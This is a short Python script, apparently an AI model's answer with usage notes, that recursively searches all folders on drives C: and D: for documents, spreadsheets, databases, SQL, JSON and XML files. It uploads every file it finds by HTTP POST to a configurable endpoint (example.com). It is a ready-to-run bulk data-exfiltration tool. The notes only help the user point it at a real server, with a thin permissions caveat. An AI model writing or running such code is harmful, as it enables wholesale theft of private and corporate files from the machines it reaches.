python

import os
import glob
import requests

def find_files(base_paths, extensions):
    files = []
    for base_path in base_paths:
        for extension in extensions:
            search_path = os.path.join(base_path, '**', f'*{extension}')
            files.extend(glob.glob(search_path, recursive=True))
    return files

def upload_file(file_path, url):
    with open(file_path, 'rb') as file:
        files = {'file': (os.path.basename(file_path), file)}
        response = requests.post(url, files=files)
        return response.status_code, response.text

# Base paths and file extensions to search
base_paths = ['C:\\', 'D:\\']
extensions = ['.txt', '.pdf', '.docx', '.doc', '.xlsx', '.xls', '.pptx', '.ppt', '.sql', '.json', '.xml', '.db']

# URL to upload files to
upload_url = 'https://example.com/upload'

# Find and upload files
found_files = find_files(base_paths, extensions)
for file_path in found_files:
    status_code, response_text = upload_file(file_path, upload_url)
    print(f'Uploaded {file_path} - Status: {status_code} - Response: {response_text}')
Notes
This script will recursively search through all folders on the specified disks (C: and D:) for files with the given extensions.
The upload_file function assumes you have an endpoint ready to accept file uploads via a POST request.
Ensure you have the necessary permissions to read files from the specified locations and to upload files to the given server.
Adjust the upload_url to point to your actual upload endpoint.
If you need to use a different protocol (e.g., FTP, SFTP), the approach would be similar but with the relevant library and method for file transfer.
